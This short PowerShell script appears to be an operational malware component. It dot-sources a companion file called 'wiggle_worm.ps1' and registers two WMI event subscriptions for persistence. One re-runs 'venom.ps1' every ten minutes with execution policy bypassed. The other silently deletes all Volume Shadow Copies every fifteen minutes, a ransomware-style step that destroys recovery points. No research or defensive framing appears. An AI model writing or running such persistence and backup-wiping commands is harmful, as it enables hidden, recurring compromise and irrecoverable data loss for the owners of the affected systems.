﻿Unblock-File $PSScriptRoot\wiggle_worm.ps1
. $PSScriptRoot\wiggle_worm.ps1
Install-WMISubscription -Name "JawLock" -Command "powershell -NoProfile -ExecutionPolicy Bypass -File 'c:\venom\venom.ps1'" -IntervalSeconds 600
Install-WMISubscription -Name "NoWayOut" -Command "cmd.exe /c vssadmin delete shadows /all /quiet" -IntervalSeconds 900